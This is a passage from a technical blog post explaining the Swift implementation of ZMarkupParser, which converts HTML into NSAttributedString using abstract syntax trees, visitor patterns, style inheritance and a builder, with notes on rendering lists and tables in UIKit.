accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : MarkupVisitor { return visitor.visit(self) }}// Leaf Nodefinal class RawStringMarkup: Markup { let attributedString: NSAttributedString init(attributedString: NSAttributedString) { self.attributedString = attributedString } weak var parentMarkup: Markup? = nil var childMarkups: [Markup] = [] func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : MarkupVisitor { return visitor.visit(self) }}Defining Markup Style Nodes:// Branch Node:// Link Stylefinal class LinkMarkup: Markup { weak var parentMarkup: Markup? = nil var childMarkups: [Markup] = [] func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : MarkupVisitor { return visitor.visit(self) }}// Bold Stylefinal class BoldMarkup: Markup { weak var parentMarkup: Markup? = nil var childMarkups: [Markup] = [] func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : MarkupVisitor { return visitor.visit(self) }} Corresponding to the source code in Markup implementation.Before converting to an abstract tree, we still need to…MarkupComponentBecause our tree structure does not depend on any data structure (for example, a node/LinkMarkup should have URL information to proceed with rendering). To address this, we define a container to store tree nodes and their related data information:protocol MarkupComponent { associatedtype T var markup: Markup { get } var value: T { get } init(markup: Markup, value: T)}extension Sequence where Iterator.Element: MarkupComponent { func value(markup: Markup) -&gt; Element.T? { return self.first(where:{ $0.markup === markup })?.value as? Element.T }} Corresponding to the source code in MarkupComponent implementation.We could also declare Markup as Hashable and directly use a Dictionary to store values [Markup: Any], but this would prevent Markup from being used as a regular type, requiring the addition of any Markup.HTMLTag &amp; HTMLTagName &amp; HTMLTagNameVisitorWe also abstract the HTML Tag Name part, allowing users to decide which Tags need to be processed, making future expansions easier. For example, the &lt;strong&gt; Tag Name can also correspond to BoldMarkup.public protocol HTMLTagName { var string: String { get } func accept&lt;V: HTMLTagNameVisitor&gt;(_ visitor: V) -&gt; V.Result}public struct A_HTMLTagName: HTMLTagName { public let string: String = WC3HTMLTagName.a.rawValue public init() { } public func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : HTMLTagNameVisitor { return visitor.visit(self) }}public struct B_HTMLTagName: HTMLTagName { public let string: String = WC3HTMLTagName.b.rawValue public init() { } public func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : HTMLTagNameVisitor { return visitor.visit(self) }} Corresponding to the source code in HTMLTagNameVisitor implementation. Additionally, refer to the W3C wiki which lists the HTML tag name enum: WC3HTMLTagName.swift.HTMLTag is simply a container object, as we want to allow external specification of the styles corresponding to HTML Tags, so we declare a container to hold them together:struct HTMLTag { let tagName: HTMLTagName let customStyle: MarkupStyle? // To be explained in the Render section later init(tagName: HTMLTagName, customStyle: MarkupStyle? = nil) { self.tagName = tagName self.customStyle = customStyle }} Corresponding to the source code in HTMLTag implementation.HTMLTagNameToHTMLMarkupVisitorstruct HTMLTagNameToMarkupVisitor: HTMLTagNameVisitor { typealias Result = Markup let attributes: [String: String]? func visit(_ tagName: A_HTMLTagName) -&gt; Result { return LinkMarkup() } func visit(_ tagName: B_HTMLTagName) -&gt; Result { return BoldMarkup() } //...} Corresponding to the source code in HTMLTagNameToHTMLMarkupVisitor implementation.Converting to an Abstract Tree with HTML DataWe need to convert the normalized HTML data results into an abstract tree. First, we declare a data structure for MarkupComponent that can hold HTML data:struct HTMLElementMarkupComponent: MarkupComponent { struct HTMLElement { let tag: HTMLTag let tagAttributedString: NSAttributedString let attributes: [String: String]? } typealias T = HTMLElement let markup: Markup let value: HTMLElement init(markup: Markup, value: HTMLElement) { self.markup = markup self.value = value }}Converting to a Markup Abstract Tree:var htmlElementComponents: [HTMLElementMarkupComponent] = []let rootMarkup = RootMarkup()var currentMarkup: Markup = rootMarkuplet htmlTags: [String: HTMLTag]init(htmlTags: [HTMLTag]) { self.htmlTags = Dictionary(uniqueKeysWithValues: htmlTags.map{ ($0.tagName.string, $0) })}// Start Tags Stack, ensuring correct pop tag// Normalization has already been done, so there shouldn't be any errors, just ensuringvar stackExpectedStartItems: [HTMLParsedResult.StartItem] = []for thisItem in from { switch thisItem { case .start(let item): let visitor = HTMLTagNameToMarkupVisitor(attributes: item.attributes) let htmlTag = self.htmlTags[item.tagName] ?? HTMLTag(tagName: ExtendTagName(item.tagName)) // Use Visitor to ask for the corresponding Markup let markup = visitor.visit(tagName: htmlTag.tagName) // Add itself as the current branch's leaf node // It becomes the current branch node htmlElementComponents.append(.init(markup: markup, value: .init(tag: htmlTag, tagAttributedString: item.tagAttributedString, attributes: item.attributes))) currentMarkup.appendChild(markup: markup) currentMarkup = markup stackExpectedStartItems.append(item) case .selfClosing(let item): // Directly add as the current branch's leaf node let visitor = HTMLTagNameToMarkupVisitor(attributes: item.attributes) let htmlTag = self.htmlTags[item.tagName] ?? HTMLTag(tagName: ExtendTagName(item.tagName)) let markup = visitor.visit(tagName: htmlTag.tagName) htmlElementComponents.append(.init(markup: markup, value: .init(tag: htmlTag, tagAttributedString: item.tagAttributedString, attributes: item.attributes))) currentMarkup.appendChild(markup: markup) case .close(let item): if let lastTagName = stackExpectedStartItems.popLast()?.tagName, lastTagName == item.tagName { // Encounter Close Tag, go back to the previous level currentMarkup = currentMarkup.parentMarkup ?? currentMarkup } case .rawString(let attributedString): // Directly add as the current branch's leaf node currentMarkup.appendChild(markup: RawStringMarkup(attributedString: attributedString)) }}// print(htmlElementComponents)// [(markup: LinkMarkup, (tag: a, attributes: [\"href\":\"zhgchg.li\"]...)]The operation result is shown in the image above. Corresponding to the source code in HTMLParsedResultToHTMLElementWithRootMarkupProcessor.swift implementation.At this point, we have actually completed the Selector functionality 🎉public class HTMLSelector: CustomStringConvertible { let markup: Markup let components: [HTMLElementMarkupComponent] init(markup: Markup, components: [HTMLElementMarkupComponent]) { self.markup = markup self.components = components } public func filter(_ htmlTagName: String) -&gt; [HTMLSelector] { let result = markup.childMarkups.filter({ components.value(markup: $0)?.tag.tagName.isEqualTo(htmlTagName) ?? false }) return result.map({ .init(markup: $0, components: components) }) } //...}We can filter leaf node objects layer by layer. Corresponding to the source code in HTMLSelector implementation.Parser — HTML to MarkupStyle (Abstract of NSAttributedString.Key)Next, we need to complete the conversion of HTML to MarkupStyle (NSAttributedString.Key).NSAttributedString uses NSAttributedString.Key Attributes to set text styles. We abstract all fields of NSAttributedString.Key to MarkupStyle, MarkupStyleColor, MarkupStyleFont, and MarkupStyleParagraphStyle.Purpose: The original Attributes data structure is [NSAttributedString.Key: Any?]. If we expose it directly, it becomes difficult to control the values users input. If they input incorrectly, it could lead to crashes, such as .font: 123. Styles need to be inheritable, for example, &lt;a&gt;&lt;b&gt;test&lt;/b&gt;&lt;/a&gt;, the style of the string “test” inherits from the link’s bold (bold + link); if we expose the Dictionary directly, it becomes difficult to manage inheritance rules. Encapsulate iOS/macOS (UIKit/AppKit) related objects.This translation maintains the original structure and meaning while ensuring the text flows naturally in English.MarkupStyle Structpublic struct MarkupStyle { public var font: MarkupStyleFont public var paragraphStyle: MarkupStyleParagraphStyle public var foregroundColor: MarkupStyleColor? = nil public var backgroundColor: MarkupStyleColor? = nil public var ligature: NSNumber? = nil public var kern: NSNumber? = nil public var tracking: NSNumber? = nil public var strikethroughStyle: NSUnderlineStyle? = nil public var underlineStyle: NSUnderlineStyle? = nil public var strokeColor: MarkupStyleColor? = nil public var strokeWidth: NSNumber? = nil public var shadow: NSShadow? = nil public var textEffect: String? = nil public var attachment: NSTextAttachment? = nil public var link: URL? = nil public var baselineOffset: NSNumber? = nil public var underlineColor: MarkupStyleColor? = nil public var strikethroughColor: MarkupStyleColor? = nil public var obliqueness: NSNumber? = nil public var expansion: NSNumber? = nil public var writingDirection: NSNumber? = nil public var verticalGlyphForm: NSNumber? = nil //... // Inherits from... // Default: If fields are nil, fill in from the provided object mutating func fillIfNil(from: MarkupStyle?) { guard let from = from else { return } var currentFont = self.font currentFont.fillIfNil(from: from.font) self.font = currentFont var currentParagraphStyle = self.paragraphStyle currentParagraphStyle.fillIfNil(from: from.paragraphStyle) self.paragraphStyle = currentParagraphStyle //.. } // Convert MarkupStyle to NSAttributedString.Key: Any func render() -&gt; [NSAttributedString.Key: Any] { var data: [NSAttributedString.Key: Any] = [:] if let font = font.getFont() { data[.font] = font } if let ligature = self.ligature { data[.ligature] = ligature } //... return data }}public struct MarkupStyleFont: MarkupStyleItem { public enum FontWeight { case style(FontWeightStyle) case rawValue(CGFloat) } public enum FontWeightStyle: String { case ultraLight, light, thin, regular, medium, semibold, bold, heavy, black // ... } public var size: CGFloat? public var weight: FontWeight? public var italic: Bool? //...}public struct MarkupStyleParagraphStyle: MarkupStyleItem { public var lineSpacing: CGFloat? = nil public var paragraphSpacing: CGFloat? = nil public var alignment: NSTextAlignment? = nil public var headIndent: CGFloat? = nil public var tailIndent: CGFloat? = nil public var firstLineHeadIndent: CGFloat? = nil public var minimumLineHeight: CGFloat? = nil public var maximumLineHeight: CGFloat? = nil public var lineBreakMode: NSLineBreakMode? = nil public var baseWritingDirection: NSWritingDirection? = nil public var lineHeightMultiple: CGFloat? = nil public var paragraphSpacingBefore: CGFloat? = nil public var hyphenationFactor: Float? = nil public var usesDefaultHyphenation: Bool? = nil public var tabStops: [NSTextTab]? = nil public var defaultTabInterval: CGFloat? = nil public var textLists: [NSTextList]? = nil public var allowsDefaultTighteningForTruncation: Bool? = nil public var lineBreakStrategy: NSParagraphStyle.LineBreakStrategy? = nil //...}public struct MarkupStyleColor { let red: Int let green: Int let blue: Int let alpha: CGFloat //...} Corresponding to the original code’s MarkupStyle implementation Additionally, refer to the W3C wiki, which lists corresponding color names and their RGB values: MarkupStyleColorName.swiftHTMLTagStyleAttribute &amp; HTMLTagStyleAttributeVisitorI would like to mention these two objects because HTML Tags can be styled using CSS. We apply the same abstraction from HTMLTagName to HTML Style Attributes.For example, HTML might provide: &lt;a style=\"color:red;font-size:14px\"&gt;RedLink&lt;/a&gt;, indicating that this link should be styled in red with a font size of 14px.public protocol HTMLTagStyleAttribute { var styleName: String { get } func accept&lt;V: HTMLTagStyleAttributeVisitor&gt;(_ visitor: V) -&gt; V.Result}public protocol HTMLTagStyleAttributeVisitor { associatedtype Result func visit(styleAttribute: HTMLTagStyleAttribute) -&gt; Result func visit(_ styleAttribute: ColorHTMLTagStyleAttribute) -&gt; Result func visit(_ styleAttribute: FontSizeHTMLTagStyleAttribute) -&gt; Result //...}public extension HTMLTagStyleAttributeVisitor { func visit(styleAttribute: HTMLTagStyleAttribute) -&gt; Result { return styleAttribute.accept(self) }} Corresponding to the original code’s HTMLTagStyleAttribute implementationHTMLTagStyleAttributeToMarkupStyleVisitorstruct HTMLTagStyleAttributeToMarkupStyleVisitor: HTMLTagStyleAttributeVisitor { typealias Result = MarkupStyle? let value: String func visit(_ styleAttribute: ColorHTMLTagStyleAttribute) -&gt; Result { // Use regex to extract Color Hex or map from HTML Pre-defined Color Name; see Source Code guard let color = MarkupStyleColor(string: value) else { return nil } return MarkupStyle(foregroundColor: color) } func visit(_ styleAttribute: FontSizeHTMLTagStyleAttribute) -&gt; Result { // Use regex to extract 10px -&gt; 10; see Source Code guard let size = self.convert(fromPX: value) else { return nil } return MarkupStyle(font: MarkupStyleFont(size: CGFloat(size))) } // ...} Corresponding to the original code’s HTMLTagAttributeToMarkupStyleVisitor.swift implementationThe init value corresponds to the attribute’s value, which is converted to the corresponding MarkupStyle field based on the visit type.HTMLElementMarkupComponentMarkupStyleVisitorAfter introducing the MarkupStyle object, we will convert the results from Normalization’s HTMLElementComponents into MarkupStyle.// MarkupStyle Strategypublic enum MarkupStylePolicy { case respectMarkupStyleFromCode // Prioritize styles from Code, filling in from HTML Style Attributes case respectMarkupStyleFromHTMLStyleAttribute // Prioritize styles from HTML Style Attributes, filling in from Code}struct HTMLElementMarkupComponentMarkupStyleVisitor: MarkupVisitor { typealias Result = MarkupStyle? let policy: MarkupStylePolicy let components: [HTMLElementMarkupComponent] let styleAttributes: [HTMLTagStyleAttribute] func visit(_ markup: BoldMarkup) -&gt; Result { // .bold is just a default style defined in MarkupStyle; see Source Code return defaultVisit(components.value(markup: markup), defaultStyle: .bold) } func visit(_ markup: LinkMarkup) -&gt; Result { // .link is just a default style defined in MarkupStyle; see Source Code var markupStyle = defaultVisit(components.value(markup: markup), defaultStyle: .link) ?? .link // Retrieve the corresponding HtmlElement from HtmlElementComponents for LinkMarkup // Look for the href parameter in the HtmlElement's attributes (the way HTML carries URL Strings) if let href = components.value(markup: markup)?.attributes?[\"href\"] as? String, let url = URL(string: href) { markupStyle.link = url } return markupStyle } // ...}extension HTMLElementMarkupComponentMarkupStyleVisitor { // Retrieve the specified custom MarkupStyle from the HTMLTag container private func customStyle(_ htmlElement: HTMLElementMarkupComponent.HTMLElement?) -&gt; MarkupStyle? { guard let customStyle = htmlElement?.tag.customStyle else { return nil } return customStyle } // Default action func defaultVisit(_ htmlElement: HTMLElementMarkupComponent.HTMLElement?, defaultStyle: MarkupStyle? = nil) -&gt; Result { var markupStyle: MarkupStyle? = customStyle(htmlElement) ?? defaultStyle // Retrieve the corresponding HtmlElement for LinkMarkup from HtmlElementComponents // Check if the HtmlElement's attributes contain a `Style` Attribute guard let styleString = htmlElement?.attributes?[\"style\"], styleAttributes.count &gt; 0 else { // None return markupStyle } // There are Style Attributes // Split the Style Value string into an array // font-size:14px;color:red -&gt; [\"font-size\":\"14px\",\"color\":\"red\"] let styles = styleString.split(separator: \";\").filter { $0.trimmingCharacters(in: .whitespacesAndNewlines) != \"\" }.map { $0.split(separator: \":\") } for style in styles { guard style.count == 2 else { continue } // e.g. font-size let key = style[0].trimmingCharacters(in: .whitespacesAndNewlines) // e.g. 14px let value = style[1].trimmingCharacters(in: .whitespacesAndNewlines) if let styleAttribute = styleAttributes.first(where: { $0.isEqualTo(styleName: key) }) { // Use the previously mentioned HTMLTagStyleAttributeToMarkupStyleVisitor to convert back to MarkupStyle let visitor = HTMLTagStyleAttributeToMarkupStyleVisitor(value: value) if var thisMarkupStyle = visitor.visit(styleAttribute: styleAttribute) { // If the Style Attribute has a value... // Merge the previous MarkupStyle result thisMarkupStyle.fillIfNil(from: markupStyle) markupStyle = thisMarkupStyle } } } // If there is a default Style if var defaultStyle = defaultStyle { switch policy { case .respectMarkupStyleFromHTMLStyleAttribute: // Style Attribute MarkupStyle takes precedence, then // Merge the defaultStyle result markupStyle?.fillIfNil(from: defaultStyle) case .respectMarkupStyleFromCode: // defaultStyle takes precedence, then // Merge the Style Attribute MarkupStyle result defaultStyle.fillIfNil(from: markupStyle) markupStyle = defaultStyle } } return markupStyle }} Corresponding to the original code’s HTMLTagAttributeToMarkupStyleVisitor.swift implementationWe will define some default styles in MarkupStyle, which will be used when certain Markup does not have externally specified styles.There are two style inheritance strategies: respectMarkupStyleFromCode:Use the default style as the primary; then see what styles can be supplemented from Style Attributes, ignoring existing values. respectMarkupStyleFromHTMLStyleAttribute:Use the Style Attributes as the primary; then see what styles can be supplemented from the default style, ignoring existing values.HTMLElementWithMarkupToMarkupStyleProcessorThis converts the normalization results into an AST &amp; MarkupStyleComponent.We declare a new MarkupComponent to store the corresponding MarkupStyle:struct MarkupStyleComponent: MarkupComponent { typealias T = MarkupStyle let markup: Markup let value: MarkupStyle init(markup: Markup, value: MarkupStyle) { self.markup = markup self.value = value }}A simple traversal of the Markup Tree &amp; HTMLElementMarkupComponent structure:let styleAttributes: [HTMLTagStyleAttribute]let policy: MarkupStylePolicy func process(from: (Markup, [HTMLElementMarkupComponent])) -&gt; [MarkupStyleComponent] { var components: [MarkupStyleComponent] = [] let visitor = HTMLElementMarkupComponentMarkupStyleVisitor(policy: policy, components: from.1, styleAttributes: styleAttributes) walk(markup: from.0, visitor: visitor, components: &amp;components) return components} func walk(markup: Markup, visitor: HTMLElementMarkupComponentMarkupStyleVisitor, components: inout [MarkupStyleComponent]) { if let markupStyle = visitor.visit(markup: markup) { components.append(.init(markup: markup, value: markupStyle)) } for markup in markup.childMarkups { walk(markup: markup, visitor: visitor, components: &amp;components) }}// print(components)// [(markup: LinkMarkup, MarkupStyle(link: https://zhgchg.li, color: .blue)]// [(markup: BoldMarkup, MarkupStyle(font: .init(weight: .bold))] Corresponding to the original code’s HTMLElementWithMarkupToMarkupStyleProcessor.swift implementationRender — Convert To NSAttributedStringNow that we have the abstract tree structure of HTML Tags and the corresponding MarkupStyle, the final step is to produce the final NSAttributedString rendering result.MarkupNSAttributedStringVisitorVisit markup to NSAttributedStringstruct MarkupNSAttributedStringVisitor: MarkupVisitor { typealias Result = NSAttributedString let components: [MarkupStyleComponent] // Root/base MarkupStyle, specified externally, e.g., can specify the size of the entire text let rootStyle: MarkupStyle? func visit(_ markup: RootMarkup) -&gt; Result { // Look down to the RawString object return collectAttributedString(markup) } func visit(_ markup: RawStringMarkup) -&gt; Result { // Return Raw String // Collect all MarkupStyles along the chain // Apply Style to NSAttributedString return applyMarkupStyle(markup.attributedString, with: collectMarkupStyle(markup)) } func visit(_ markup: BoldMarkup) -&gt; Result { // Look down to the RawString object return collectAttributedString(markup) } func visit(_ markup: LinkMarkup) -&gt; Result { // Look down to the RawString object return collectAttributedString(markup) } // ...}private extension MarkupNSAttributedStringVisitor { // Apply Style to NSAttributedString func applyMarkupStyle(_ attributedString: NSAttributedString, with markupStyle: MarkupStyle?) -&gt; NSAttributedString { guard let markupStyle = markupStyle else { return attributedString } let mutableAttributedString = NSMutableAttributedString(attributedString: attributedString) mutableAttributedString.addAttributes(markupStyle.render(), range: NSMakeRange(0, mutableAttributedString.string.utf16.count)) return mutableAttributedString } func collectAttributedString(_ markup: Markup) -&gt; NSMutableAttributedString { // Collect from downstream // Root -&gt; Bold -&gt; String(\"Bold\") // \\ // &gt; String(\"Test\") // Result: Bold Test // Recursively visit and combine the final NSAttributedString layer by layer return markup.childMarkups.compactMap({ visit(markup: $0) }).reduce(NSMutableAttributedString()) { partialResult, attributedString in partialResult.append(attributedString) return partialResult } } func collectMarkupStyle(_ markup: Markup) -&gt; MarkupStyle? { // Collect from upstream // String(\"Test\") -&gt; Bold -&gt; Italic -&gt; Root // Result: style: Bold+Italic // Recursively find the parent tag's markup style // Then inherit styles layer by layer var currentMarkup: Markup? = markup.parentMarkup var currentStyle = components.value(markup: markup) while let thisMarkup = currentMarkup { guard let thisMarkupStyle = components.value(markup: thisMarkup) else { currentMarkup = thisMarkup.parentMarkup continue } if var thisCurrentStyle = currentStyle { thisCurrentStyle.fillIfNil(from: thisMarkupStyle) currentStyle = thisCurrentStyle } else { currentStyle = thisMarkupStyle } currentMarkup = thisMarkup.parentMarkup } if var currentStyle = currentStyle { currentStyle.fillIfNil(from: rootStyle) return currentStyle } else { return rootStyle } }} Corresponding to the original code’s MarkupNSAttributedStringVisitor.swift implementationUltimately, we can achieve:Li{ NSColor = \"Blue\"; NSFont = \"&lt;UICTFont: 0x145d17600&gt; font-family: \\\".SFUI-Regular\\\"; font-weight: normal; font-style: normal; font-size: 13.00pt\"; NSLink = \"https://zhgchg.li\";}nk{ NSColor = \"Blue\"; NSFont = \"&lt;UICTFont: 0x145d18710&gt; font-family: \\\".SFUI-Semibold\\\"; font-weight: bold; font-style: normal; font-size: 13.00pt\"; NSLink = \"https://zhgchg.li\";}Bold{ NSFont = \"&lt;UICTFont: 0x145d18710&gt; font-family: \\\".SFUI-Semibold\\\"; font-weight: bold; font-style: normal; font-size: 13.00pt\";} 🎉🎉🎉🎉 Completed 🎉🎉🎉🎉We have now completed the entire process of converting an HTML String to NSAttributedString.Stripper — Removing HTML TagsRemoving HTML Tags is relatively simple; it only requires:func attributedString(_ markup: Markup) -&gt; NSAttributedString { if let rawStringMarkup = markup as? RawStringMarkup { return rawStringMarkup.attributedString } else { return markup.childMarkups.compactMap({ attributedString($0) }).reduce(NSMutableAttributedString()) { partialResult, attributedString in partialResult.append(attributedString) return partialResult } }} Corresponding to the original code’s MarkupStripperProcessor.swift implementationThis is similar to Render, but purely returns the content after finding RawStringMarkup.Extend — Dynamic ExpansionTo expand the coverage of all HTML tags and style attributes, a dynamic extension point was created to facilitate the direct dynamic expansion of objects from code.public struct ExtendTagName: HTMLTagName { public let string: String public init(_ w3cHTMLTagName: WC3HTMLTagName) { self.string = w3cHTMLTagName.rawValue } public init(_ string: String) { self.string = string.trimmingCharacters(in: .whitespacesAndNewlines).lowercased() } public func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : HTMLTagNameVisitor { return visitor.visit(self) }}// tofinal class ExtendMarkup: Markup { weak var parentMarkup: Markup? = nil var childMarkups: [Markup] = [] func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : MarkupVisitor { return visitor.visit(self) }}//----public struct ExtendHTMLTagStyleAttribute: HTMLTagStyleAttribute { public let styleName: String public let render: ((String) -&gt; (MarkupStyle?)) // Dynamic closure to change MarkupStyle public init(styleName: String, render: @escaping ((String) -&gt; (MarkupStyle?))) { self.styleName = styleName self.render = render } public func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : HTMLTagStyleAttributeVisitor { return visitor.visit(self) }}ZHTMLParserBuilderFinally, we use the Builder Pattern to allow external modules to quickly construct the objects needed for ZMarkupParser, while also managing access level control.public final class ZHTMLParserBuilder { private(set) var htmlTags: [HTMLTag] = [] private(set) var styleAttributes: [HTMLTagStyleAttribute] = [] private(set) var rootStyle: MarkupStyle? private(set) var policy: MarkupStylePolicy = .respectMarkupStyleFromCode public init() { } public static func initWithDefault() -&gt; Self { var builder = Self.init() for htmlTagName in ZHTMLParserBuilder.htmlTagNames { builder = builder.add(htmlTagName) } for styleAttribute in ZHTMLParserBuilder.styleAttributes { builder = builder.add(styleAttribute) } return builder } public func set(_ htmlTagName: HTMLTagName, withCustomStyle markupStyle: MarkupStyle?) -&gt; Self { return self.add(htmlTagName, withCustomStyle: markupStyle) } public func add(_ htmlTagName: HTMLTagName, withCustomStyle markupStyle: MarkupStyle? = nil) -&gt; Self { // Only one instance of the same tagName can exist htmlTags.removeAll { htmlTag in return htmlTag.tagName.string == htmlTagName.string } htmlTags.append(HTMLTag(tagName: htmlTagName, customStyle: markupStyle)) return self } public func add(_ styleAttribute: HTMLTagStyleAttribute) -&gt; Self { styleAttributes.removeAll { thisStyleAttribute in return thisStyleAttribute.styleName == styleAttribute.styleName } styleAttributes.append(styleAttribute) return self } public func set(rootStyle: MarkupStyle) -&gt; Self { self.rootStyle = rootStyle return self } public func set(policy: MarkupStylePolicy) -&gt; Self { self.policy = policy return self } public func build() -&gt; ZHTMLParser { // ZHTMLParser init is only accessible internally; it cannot be directly initialized from outside // It can only be initialized through ZHTMLParserBuilder return ZHTMLParser(htmlTags: htmlTags, styleAttributes: styleAttributes, policy: policy, rootStyle: rootStyle) }} Corresponding implementation in the original source code: ZHTMLParserBuilder.swiftThe initWithDefault method will by default add all implemented HTMLTagName/Style Attributes.public extension ZHTMLParserBuilder { static var htmlTagNames: [HTMLTagName] { return [ A_HTMLTagName(), B_HTMLTagName(), BR_HTMLTagName(), DIV_HTMLTagName(), HR_HTMLTagName(), I_HTMLTagName(), LI_HTMLTagName(), OL_HTMLTagName(), P_HTMLTagName(), SPAN_HTMLTagName(), STRONG_HTMLTagName(), U_HTMLTagName(), UL_HTMLTagName(), DEL_HTMLTagName(), TR_HTMLTagName(), TD_HTMLTagName(), TH_HTMLTagName(), TABLE_HTMLTagName(), IMG_HTMLTagName(handler: nil), // ... ] }}public extension ZHTMLParserBuilder { static var styleAttributes: [HTMLTagStyleAttribute] { return [ ColorHTMLTagStyleAttribute(), BackgroundColorHTMLTagStyleAttribute(), FontSizeHTMLTagStyleAttribute(), FontWeightHTMLTagStyleAttribute(), LineHeightHTMLTagStyleAttribute(), WordSpacingHTMLTagStyleAttribute(), // ... ] }}The ZHTMLParser initialization is only accessible internally; it cannot be directly initialized from outside, and can only be initialized through ZHTMLParserBuilder.ZHTMLParser encapsulates Render/Selector/Stripper operations:public final class ZHTMLParser: ZMarkupParser { let htmlTags: [HTMLTag] let styleAttributes: [HTMLTagStyleAttribute] let rootStyle: MarkupStyle? internal init(...) { } // Retrieve link style attributes public var linkTextAttributes: [NSAttributedString.Key: Any] { // ... } public func selector(_ string: String) -&gt; HTMLSelector { // ... } public func selector(_ attributedString: NSAttributedString) -&gt; HTMLSelector { // ... } public func render(_ string: String) -&gt; NSAttributedString { // ... } // Allows rendering of NSAttributedString within nodes using HTMLSelector results public func render(_ selector: HTMLSelector) -&gt; NSAttributedString { // ... } public func render(_ attributedString: NSAttributedString) -&gt; NSAttributedString { // ... } public func stripper(_ string: String) -&gt; String { // ... } public func stripper(_ attributedString: NSAttributedString) -&gt; NSAttributedString { // ... } // ...} Corresponding implementation in the original source code: ZHTMLParser.swiftUIKit IssuesThe result of NSAttributedString is most commonly displayed in a UITextView, but there are some important considerations: The link style in UITextView is uniformly determined by the linkTextAttributes setting, and it does not consider the settings of NSAttributedString.Key, nor can individual styles be set; hence the need for the ZMarkupParser.linkTextAttributes property. Currently, UILabel does not have a way to change link styles, and since UILabel does not have NSTextStorage, if you want to load NSTextAttachment images, you need to handle UILabel separately.public extension UITextView { func setHtmlString(_ string: String, with parser: ZHTMLParser) { self.setHtmlString(NSAttributedString(string: string), with: parser) } func setHtmlString(_ string: NSAttributedString, with parser: ZHTMLParser) { self.attributedText = parser.render(string) self.linkTextAttributes = parser.linkTextAttributes }}public extension UILabel { func setHtmlString(_ string: String, with parser: ZHTMLParser) { self.setHtmlString(NSAttributedString(string: string), with: parser) } func setHtmlString(_ string: NSAttributedString, with parser: ZHTMLParser) { let attributedString = parser.render(string) attributedString.enumerateAttribute(NSAttributedString.Key.attachment, in: NSMakeRange(0, attributedString.string.utf16.count), options: []) { (value, effectiveRange, nil) in guard let attachment = value as? ZNSTextAttachment else { return } attachment.register(self) } self.attributedText = attributedString }}Thus, we extended UIKit, allowing external modules to simply call setHTMLString() to complete the binding.Complex Rendering Items — Item ListsHere’s a record of the implementation regarding item lists.Using &lt;ol&gt; / &lt;ul&gt; to wrap &lt;li&gt; in HTML represents an item list:&lt;ul&gt; &lt;li&gt;ItemA&lt;/li&gt; &lt;li&gt;ItemB&lt;/li&gt; &lt;li&gt;ItemC&lt;/li&gt; //...&lt;/ul&gt;Using the parsing method mentioned earlier, we can retrieve other list items in visit(_ markup: ListItemMarkup) to know the current list index (thanks to the conversion to AST).func visit(_ markup: ListItemMarkup) -&gt; Result { let siblingListItems = markup.parentMarkup?.childMarkups.filter({ $0 is ListItemMarkup }) ?? [] let position = (siblingListItems.firstIndex(where: { $0 === markup }) ?? 0)}NSParagraphStyle has an NSTextList object that can be used to display list items, but in practice, it cannot be customized for the width of the whitespace (I personally feel the whitespace is too large). If there is whitespace between the bullet and the string, it can trigger a line break, which may look a bit odd, as shown in the image below:The better part can potentially be achieved by setting headIndent, firstLineHeadIndent, and NSTextTab, but testing revealed that if the string is too long or the size changes, it still does not present a perfect result.Currently, we have only achieved an acceptable solution by manually inserting the item list string before the string.We only use NSTextList.MarkerFormat to generate the list item symbols, rather than using NSTextList directly.For a list of supported list symbols, refer to: MarkupStyleList.swiftFinal display result: ( &lt;ol&gt;&lt;li&gt; )Complex Rendering Items — TablesSimilar to the implementation of item lists, but for tables.Using &lt;table&gt; to wrap &lt;tr&gt; for table rows, and wrapping &lt;td&gt;/&lt;th&gt; for table columns in HTML:&lt;table&gt; &lt;tr&gt; &lt;th&gt;Company&lt;/th&gt; &lt;th&gt;Contact&lt;/th&gt; &lt;th&gt;Country&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Alfreds Futterkiste&lt;/td&gt; &lt;td&gt;Maria Anders&lt;/td&gt; &lt;td&gt;Germany&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Centro comercial Moctezuma&lt;/td&gt; &lt;td&gt;Francisco Chang&lt;/td&gt; &lt;td&gt;Mexico&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;Testing revealed that the native NSAttributedString.DocumentType.html uses the private macOS API NSTextBlock to display, thus being able to fully render HTML table styles and content. A bit of a cheat! We cannot use private APIs 🥲func visit(_ markup: TableColumnMarkup) -&gt; Result { let attributedString = collectAttributedString(markup) let siblingColumns = markup.parentMarkup?.childMarkups.filter({ $0 is TableColumnMarkup }) ?? [] let position = (siblingColumns.firstIndex(where: { $0 === markup }) ?? 0) // Optionally specify the desired width from the outside; can set to .max to avoid truncating the string var maxLength: Int? = markup.fixedMaxLength if maxLength == nil { // If not specified, find the length of the string in the first row of the same column as the max length if let tableRowMarkup = markup.parentMarkup as? TableRowMarkup, let firstTableRow = tableRowMarkup.parentMarkup?.childMarkups.first(where: { $0 is TableRowMarkup }) as? TableRowMarkup { let firstTableRowColumns = firstTableRow.childMarkups.filter({ $0 is TableColumnMarkup }) if firstTableRowColumns.indices.contains(position) { let firstTableRowColumnAttributedString = collectAttributedString(firstTableRowColumns[position]) let length = firstTableRowColumnAttributedString.string.utf16.count maxLength = length } } } if let maxLength = maxLength { // If the column exceeds maxLength, truncate the string if attributedString.string.utf16.count &gt; maxLength { attributedString.mutableString.setString(String(attributedString.string.prefix(maxLength))+\"...\") } else { attributedString.mutableString.setString(attributedString.string.padding(toLength: maxLength, withPad: \" \", startingAt: 0)) } } if position &lt; siblingColumns.count - 1 { // Add whitespace as spacing; the external can specify how many spaces to use for spacing attributedString.append(makeString(in: markup, string: String(repeating: \" \", count: markup.spacing))) } return attributedString}func visit(_ markup: TableRowMarkup) -&gt; Result { let attributedString = collectAttributedString(markup) attributedString.append(makeBreakLine(in: markup)) // Add a line break; see source code for details return attributedString}func visit(_ markup: TableMarkup) -&gt; Result { let attributedString = collectAttributedString(markup) attributedString.append(makeBreakLine(in: markup)) // Add a line break; see source code for details attributedString.insert(makeBreakLine(in: markup), at: 0) // Add a line break; see source code for details return attributedString}Final presentation effect as shown 